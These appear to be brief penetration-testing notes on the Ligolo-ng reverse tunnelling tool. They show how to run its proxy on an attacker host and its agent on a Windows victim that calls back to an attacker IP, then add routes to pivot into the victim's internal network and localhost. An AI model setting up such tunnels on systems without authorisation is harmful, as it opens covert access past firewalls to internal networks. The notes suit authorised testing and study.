# Nigolo-ng

Ligolo-NG is a lightweight, fast, and secure reverse tunneling tool, typically used in penetration testing and red teaming to establish a secure connection between a compromised machine and an attacker’s machine. It allows attackers to create a reverse tunnel, enabling access to internal network resources through an encrypted channel. Ligolo-NG is favored for its ease of use and efficiency in bypassing firewalls and NAT (Network Address Translation) to facilitate lateral movement within a target network.

- Download releasse from [github page](https://github.com/nicocha30/ligolo-ng)
- 2 types of assets:
    - ligolo-ng_proxy: attacker machine
    - ligolo-ng_agent: victim machine

## Set up proxy

### Linux machine

```sh
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
```

## Linux attack windows

```sh
# Linux
./proxy -selfcert

# windows
./agent.exe -connect <attack-ip>:11601 -ignore-cert 2>&1

# Linux
## on other terminal
### for pivot, use internal network ip victime
sudo ip route add <ip-victime>/<range> dev ligolo
### to access localhost
ip route add 240.0.0.1/32 dev ligolo
### now host of the victime is accessible trought 240.0.0.1

## On ligolo
> session 
    > <number-session>
> start
```
